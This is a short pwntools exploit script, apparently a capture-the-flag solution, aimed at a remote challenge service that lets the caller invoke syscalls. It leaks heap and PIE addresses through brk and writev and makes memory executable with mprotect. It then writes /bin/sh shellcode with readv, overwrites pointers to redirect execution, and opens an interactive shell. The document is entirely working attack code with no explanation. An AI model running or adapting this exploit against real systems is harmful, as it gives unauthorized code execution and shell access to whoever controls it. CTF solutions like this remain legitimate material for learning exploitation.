from pwn import *

#context.log_level = "DEBUG"
context.arch = "amd64"

#p = process("./chall")
p = remote("13.231.207.73",9006)

SYS_MMAP = 9 
SYS_BRK = 12
SYS_WRITEV = 20
SYS_READV = 19
SYS_MPROTECT = 10

def syscall(rax , rdi , rsi , rdx) : 
    p.sendlineafter(":",str(rax))
    p.sendlineafter(":",str(rdi))
    p.sendlineafter(":",str(rsi))
    p.sendlineafter(":",str(rdx))
   
syscall(SYS_BRK ,0 , 0 ,0)  
p.recvuntil("retval: ")
heap = int(p.recvline().strip(),16)
print hex(heap)

syscall(SYS_WRITEV,1,heap-0xf178,0x50)
syscall(SYS_WRITEV,1,heap-0xf178-0x18,1)

p.recvline()
pie = u64(p.recv(8)) + 0x200eec

print hex(pie)

syscall(SYS_WRITEV,1,heap-0xf178-0x18,1)

syscall(SYS_MPROTECT,heap-0xf178 & ~0xfff,0x1000,7)
syscall(SYS_MPROTECT,pie,0x1000,7)

syscall(SYS_READV,0,heap-0xf178,0x51)

p.send("B"*8+p64(0)*3+asm(shellcraft.sh()))

syscall(SYS_READV,0,heap-0xf178-0x18,1)

p.send(p64(heap-0xf158)*3)

p.interactive()
